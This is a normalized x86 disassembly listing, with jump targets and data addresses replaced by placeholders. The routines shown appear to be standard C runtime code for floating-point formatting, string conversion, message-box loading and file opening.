pop ecx
mov [ esi ] 0x30
pop ecx
inc esi
jmp r-xdata
pop edi
push 0x1
push esi
call sub_432bc8
mov eax [ ebp - 0x14 ]
pop ecx
mov eax [ eax + 0x84 ]
pop ecx
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov eax [ ebp + 0x14 ]
inc esi
mov eax [ eax + 0x4 ]
test eax eax
jns r-xdata
test edi edi
jle r-xdata
cmp [ ebp + 0x18 ] bl
je r-xdata
neg eax
cmp edi eax
jl r-xdata
mov edi eax
neg edi
jmp r-xdata
push edi
push esi
call sub_432bc8
push edi
push 0x30
push esi
call sub_427900
add esp 0x14
mov edi eax
sub_432888
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_4380ea
add esp 0x14
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_427b11
mov [ eax ] ebx
call sub_42a231
mov eax ebx
jmp r-xdata
or ecx 0xffffffff
cmp esi ecx
je r-xdata
call sub_427b11
mov [ eax ] ebx
call sub_42a231
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
mov ebx [ ebp + 0x14 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x28 ]
add eax ebx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
push ecx
sete al
add eax edi
push eax
call sub_437e5c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
mov ecx esi
sete al
sub ecx eax
pop esi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push ebx
push esi
push edi
call sub_43279e
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
sub_432947
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_4380ea
add esp 0x14
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_427b11
mov [ eax ] ebx
call sub_42a231
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
xor ecx ecx
cmp [ ebp - 0x30 ] 0x2d
mov [ ebp - 0x20 ] eax
sete cl
or eax 0xffffffff
lea ebx [ ecx + edi ]
cmp esi eax
je r-xdata
call sub_427b11
mov [ eax ] ebx
call sub_42a231
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
lea ecx [ ebp - 0x30 ]
push ecx
push [ ebp + 0x14 ]
push eax
push ebx
call sub_437e5c
add esp 0x10
test eax eax
je r-xdata
mov eax esi
sub eax ecx
pop esi
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ edi ] 0x0
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push edi
call sub_432583
add esp 0x1c
cmp eax [ ebp + 0x14 ]
jge r-xdata
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x14 ]
push esi
push edi
call sub_43279e
add esp 0x18
jmp r-xdata
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
mov [ ebx - 0x2 ] al
sub_432a55
push ebp
mov ebp esp
sub esp 0x10
push edi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4247f2
mov edx [ ebp + 0x8 ]
mov edi [ ebp - 0x10 ]
mov cl [ edx ]
test cl cl
je r-xdata
mov al [ edx ]
inc edx
test al al
je r-xdata
mov eax [ edi + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
cmp [ ebp - 0x4 ] 0x0
pop edi
je r-xdata
jmp r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov al [ edx ]
test al al
jne r-xdata
cmp cl al
je r-xdata
cmp al 0x65
je r-xdata
push esi
mov esi edx
cmp al 0x45
je r-xdata
dec edx
cmp [ edx ] 0x30
je r-xdata
mov eax [ edi + 0x84 ]
mov ecx [ eax ]
mov al [ edx ]
cmp al [ ecx ]
jne r-xdata
inc edx
mov al [ esi ]
inc edx
inc esi
mov [ edx ] al
test al al
jne r-xdata
dec edx
pop esi
sub_432aeb
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_437f98
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_437f0c
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
add esp 0xc
leave
retn
sub_432b3c
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push esi
push [ ebp + 0xc ]
call sub_4247f2
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_427cbf
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_425fc0
test eax eax
movsx eax [ esi ]
push eax
call sub_427cbf
pop ecx
cmp eax 0x78
jne r-xdata
mov eax [ ebp - 0x10 ]
mov cl [ esi ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
add esi 0x2
mov al [ esi ]
mov [ esi ] cl
mov cl al
mov al [ esi ]
inc esi
test al al
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] al
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_432bae
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
fldz
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_432bc8
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_425610
inc eax
push eax
lea eax [ esi + edi ]
push esi
push eax
call sub_421ef0
add esp 0x10
pop esi
sub_432bf0
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_43827f
add esp 0xc
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_42a241
int3
pop esi
retn
sub_432c17
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4247f2
mov eax [ ebp - 0x10 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_432c60
cmp [ edx + 0xe ] 0x5
jne r-xdata
mov bx 0x133f
mov bx [ ebp - 0xa4 ]
or bh 0x2
and bh 0xfe
mov bl 0x3f
jmp r-xdata
mov [ ebp - 0xa2 ] bx
fldcw [ ebp - 0xa2 ]
mov ebx r--data
fxam
mov [ ebp - 0x94 ] edx
fwait
fnstsw [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] 0x0
fwait
mov cl [ ebp - 0x9f ]
shl cl 0x1
sar cl 0x1
rol cl 0x1
mov al cl
and al 0xf
xlat
movsx eax al
and ecx 0x404
mov ebx edx
add ebx eax
add ebx 0x10
jmp [ ebx ]
sub_432e30
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_4382dc
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_432e47
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_4382dc
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_432ed5
mov eax [ edx + 0x4 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ edx + 0x4 ]
sub esp 0xa
or eax 0x7fff0000
mov [ esp + 0x6 ] eax
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
shld eax ecx 0xb
shl ecx 0xb
mov [ esp + 0x4 ] eax
mov [ esp ] ecx
fld [ esp ]
add esp 0xa
test eax 0x0
mov eax [ edx + 0x4 ]
retn
fld [ edx ]
retn
sub_432f65
sub esp 0x8
fst [ esp ]
mov eax [ esp + 0x4 ]
add esp 0x8
and eax 0x7ff00000
jmp r-xdata
cmp eax 0x7ff00000
je r-xdata
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
mov eax 0x3
jbe r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
cmp edx 0x1d
je r-xdata
fmul [ r--data ]
jmp r-xdata
pop edx
retn
and ax 0x20
jne r-xdata
call sub_432e30
pop edx
retn
call sub_432e47
pop edx
retn
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
sub_43301c
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ EncodePointer@IAT ]
push esi
push edi
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
xor edi edi
push edi
mov [ ebp - 0x20 ] eax
call ebx
mov esi eax
mov [ ebp - 0x18 ] esi
call sub_4275e6
mov [ ebp - 0x14 ] eax
cmp [ rw-data ] edi
jne r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
push 0x800
push edi
push r--data
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
mov eax [ rw-data ]
mov ebx [ DecodePointer@IAT ]
cmp eax esi
je r-xdata
push [ rw-data ]
call [ DecodePointer@IAT ]
push 0x3
jmp r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
push eax
call [ OutputDebugStringW@IAT ]
xor eax eax
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
test eax eax
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop eax
jmp r-xdata
push 0x4
mov esi [ ebp - 0x18 ]
push r--data
push esi
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
mov esi [ ebp + 0x10 ]
push eax
call ebx
test eax eax
je r-xdata
push eax
call ebx
push [ rw-data ]
mov [ ebp - 0x14 ] eax
call ebx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
push esi
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push edi
call eax
jmp r-xdata
call eax
mov edi eax
test edi edi
je r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call ecx
test eax eax
je r-xdata
push eax
call ebx
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
or esi 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call [ ebp - 0x18 ]
test eax eax
je r-xdata
push edi
call eax
mov edi eax
push [ rw-data ]
call ebx
test eax eax
je r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_4331fe
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov eax [ eax ]
push esi
mov eax [ eax + 0x4 ]
push edi
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call sub_42968a
mov ebx eax
add esp 0x10
test ebx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov edi esi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
leave
retn
push ebx
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_42968a
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebx * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push edi
call sub_42487a
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_42276a
mov edi eax
pop ecx
test edi edi
je r-xdata
call sub_42fa60
mov edi esp
test edi edi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov [ edi ] 0xdddd
mov [ edi ] 0xcccc
jmp r-xdata
push 0xffffffff
push edi
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test edi edi
je r-xdata
add edi 0x8
jmp r-xdata
sub_4332d6
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4247f2
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4331fe
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_43330e
push ebp
mov ebp esp
sub esp 0x1c
push esi
call sub_4275e6
test eax eax
je r-xdata
mov esi [ ebp - 0x4 ]
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
or eax [ ebp + 0x20 ]
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
mov [ ebp - 0x1c ] 0x18
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
call sub_4275e6
test eax eax
mov eax [ ebp + 0x1c ]
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
leave
retn
sub_43339f
push 0x14
push r--data
call sub_429ad0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_427b11
push 0x16
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_429b15
retn
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x1c ]
push eax
call sub_433466
add esp 0x1c
mov edi eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43343a
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_43343a
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_435345
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x4 ] 0xfe
sub_433466
push ebp
mov ebp esp
sub esp 0x38
push ebx
xor ebx ebx
test [ ebp + 0x14 ] 0x80
push edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x38 ] 0xc
mov [ ebp - 0x34 ] ebx
je r-xdata
mov [ ebp - 0x30 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_42a241
int3
mov ecx [ ebp + 0x14 ]
mov eax 0x8000
test eax ecx
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_438599
pop ecx
test eax eax
jne r-xdata
mov eax ecx
and eax 0x3
mov edx 0xc0000000
sub eax ebx
je r-xdata
test ecx 0x74000
jne r-xdata
mov edi 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0xc ] ebx
sub eax esi
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
sub eax esi
je r-xdata
mov edi 0x40000000
jmp r-xdata
test ecx 0x70000
je r-xdata
mov edi edx
jmp r-xdata
call sub_427add
mov [ eax ] ebx
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
call sub_427b11
push 0x16
pop ebx
mov [ eax ] ebx
call sub_42a231
mov eax ebx
jmp r-xdata
xor esi esi
inc esi
cmp eax 0x600
je r-xdata
push 0x3
test eax eax
je r-xdata
mov eax ecx
and eax 0x700
mov esi 0x400
cmp eax esi
jg r-xdata
mov [ ebp - 0xc ] edx
jmp r-xdata
sub eax esi
je r-xdata
mov [ ebp - 0x8 ] edi
mov edi edx
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop ebx
leave
retn
test cl 0x40
je r-xdata
mov eax [ rw-data ]
not eax
and eax [ ebp + 0x1c ]
test al al
mov eax ebx
js r-xdata
push 0x5
jmp r-xdata
cmp eax 0x700
je r-xdata
mov edx 0x80
mov eax ebx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x10 ] eax
test ecx 0x100
je r-xdata
cmp eax 0x100
je r-xdata
mov [ ebp - 0xc ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
mov eax [ ebp + 0x18 ]
push esi
push 0x10
pop esi
push 0x2
pop edx
mov [ ebp - 0x28 ] edx
sub eax esi
je r-xdata
test ecx 0x1000
je r-xdata
or edi 0x10000
or [ ebp - 0xc ] 0x4
mov eax 0x4000000
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] edi
xor edx edx
inc edx
mov [ ebp - 0x18 ] edx
pop esi
jmp r-xdata
call sub_427add
mov [ eax ] ebx
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
call sub_427b11
push 0x16
pop ebx
mov [ eax ] ebx
call sub_42a231
jmp r-xdata
push 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp edi 0x80000000
sete al
mov [ ebp - 0xc ] eax
jmp r-xdata
test ecx 0x2000
je r-xdata
or edx 0x100
mov [ ebp - 0x18 ] edx
mov eax ebx
jmp r-xdata
cmp eax 0x300
jne r-xdata
test cl 0x20
je r-xdata
or eax 0x2000000
mov [ ebp - 0x10 ] eax
pop esi
mov esi edx
jmp r-xdata
test cl 0x10
je r-xdata
or eax 0x8000000
jmp r-xdata
call sub_435031
mov edi [ ebp + 0xc ]
mov [ edi ] eax
cmp eax 0xffffffff
jne r-xdata
or eax 0x10000000
mov [ ebp - 0x10 ] eax
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp - 0x18 ]
mov [ eax ] 0x1
push esi
lea eax [ ebp - 0x38 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
call sub_43330e
add esp 0x1c
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_427add
mov [ eax ] ebx
or [ edi ] 0xffffffff
call sub_427b11
mov [ eax ] 0x18
call sub_427b11
mov eax [ eax ]
push eax
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx 0xc0000000
mov eax ecx
and eax edx
cmp eax edx
jne r-xdata
cmp eax 0x2
jne r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_427af0
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_427af0
test [ ebp + 0x14 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_427b11
mov ebx [ eax ]
jmp r-xdata
call sub_427b11
mov [ eax ] 0xd
jmp r-xdata
push [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
push [ ebp - 0x18 ]
and ecx 0x7fffffff
push esi
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
push ecx
push [ ebp + 0x10 ]
call sub_43330e
add esp 0x1c
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ edi ]
call sub_4352c3
mov dl [ ebp - 0x1 ]
pop ecx
pop ecx
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
or dl 0x1
mov [ eax + ecx + 0x4 ] dl
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
mov [ ebp - 0x1 ] dl
and [ eax + ecx + 0x24 ] 0x80
mov ecx [ ebp + 0x14 ]
mov al dl
and al 0x48
mov [ ebp - 0x3 ] al
jne r-xdata
or [ ebp - 0x1 ] 0x8
test dl dl
jns r-xdata
test dl dl
jns r-xdata
mov edx [ edi ]
mov eax edx
sar eax 0x5
and edx 0x1f
mov ecx [ eax * 4 + rw-data ]
shl edx 0x6
mov al [ ecx + edx + 0x24 ]
xor al [ ebp - 0x2 ]
and al 0x7f
xor [ ecx + edx + 0x24 ] al
mov esi [ edi ]
mov ecx [ ebp + 0x14 ]
mov eax esi
sar eax 0x5
and esi 0x1f
mov edx [ eax * 4 + rw-data ]
shl esi 0x6
shr ecx 0x10
mov al [ edx + esi + 0x24 ]
shl cl 0x7
and al 0x7f
or cl al
mov [ edx + esi + 0x24 ] cl
mov ecx [ ebp + 0x14 ]
cmp [ ebp - 0x3 ] bl
jne r-xdata
test ecx 0x74000
jne r-xdata
test cl 0x2
je r-xdata
mov esi [ ebp - 0x8 ]
mov edx 0xc0000000
mov eax esi
and eax edx
cmp eax edx
jne r-xdata
test cl 0x8
je r-xdata
mov eax ecx
and eax 0x74000
cmp eax 0x4000
je r-xdata
mov eax [ ebp - 0x20 ]
and eax 0x74000
jne r-xdata
push 0x2
push 0xffffffff
push 0xffffffff
push [ edi ]
call sub_42cb83
mov ecx eax
and ecx edx
add esp 0x10
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x14 ] edx
cmp ecx 0xffffffff
jne r-xdata
test cl 0x1
je r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
or [ eax + ecx + 0x4 ] 0x20
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or ecx eax
or ecx 0x4000
jmp r-xdata
push 0x1
lea eax [ ebp - 0x24 ]
push eax
push [ edi ]
mov [ ebp - 0x24 ] ebx
call sub_42b898
add esp 0xc
test eax eax
jne r-xdata
call sub_427add
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
push [ ebp - 0x18 ]
and esi 0x7fffffff
push 0x3
push eax
push [ ebp - 0xc ]
push esi
push [ ebp + 0x10 ]
call sub_43330e
add esp 0x1c
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x14 ] ebx
test dl 0x40
jne r-xdata
mov eax ecx
and eax 0x301
cmp eax 0x301
jne r-xdata
cmp eax 0x14000
je r-xdata
mov [ ebp + 0x14 ] ecx
push ebx
push ebx
push ebx
push [ edi ]
call sub_42cb83
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x24 ] 0x1a
jne r-xdata
mov dl [ ebp - 0x1 ]
mov ecx [ ebp + 0x14 ]
push [ edi ]
call sub_42d197
jmp r-xdata
mov edx [ edi ]
mov ecx edx
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rw-data ]
shl edx 0x6
mov [ edx + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_427af0
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
push [ edi ]
call sub_4351d6
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test ecx 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
push [ ebp - 0x14 ]
push [ ebp - 0x2c ]
push [ edi ]
call sub_4383e5
add esp 0xc
cmp eax 0xffffffff
je r-xdata
pop ecx
test esi esi
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
push 0x2
pop ecx
cmp esi ecx
jbe r-xdata
push 0x3
lea eax [ ebp - 0x14 ]
push eax
push [ edi ]
call sub_42b898
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi ebx
dec eax
je r-xdata
cmp esi 0x4
ja r-xdata
mov ecx [ ebp - 0x14 ]
push 0x2
pop edx
cmp eax edx
je r-xdata
test esi esi
je r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
push 0x3
pop ecx
mov [ ebp - 0x14 ] 0xbfbbef
mov [ ebp - 0x28 ] ecx
dec eax
jne r-xdata
cmp esi 0x5
je r-xdata
push ecx
push ebx
push ebx
push [ edi ]
call sub_42cb83
add esp 0x10
or eax edx
je r-xdata
and ecx 0xffff
cmp ecx 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
push 0x2
pop ecx
cmp esi ecx
jbe r-xdata
mov ecx [ ebp - 0x28 ]
add esi eax
cmp ecx esi
